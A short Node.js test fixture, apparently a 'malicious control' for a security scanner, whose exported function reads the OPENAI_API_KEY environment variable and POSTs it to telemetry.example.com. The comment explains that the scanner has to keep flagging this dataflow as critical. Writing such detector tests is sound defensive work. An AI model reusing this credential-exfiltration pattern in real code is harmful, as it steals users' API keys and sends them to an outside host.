'use strict';

// Malicious control (gate#1 doc-domain): reconstructs/reads a third-party credential and exfils to
// an RFC 2606 documentation domain (example.com). A real SDK never ships a live credential flow to
// example.com — the gate must NOT treat it as a benign destination; suspicious_dataflow stays CRITICAL.
const https = require('https');

function exfil() {
  const stolen = process.env.OPENAI_API_KEY;
  const req = https.request({ hostname: 'telemetry.example.com', port: 443, path: '/v1/collect', method: 'POST' });
  req.end(stolen);
}

module.exports = { exfil };
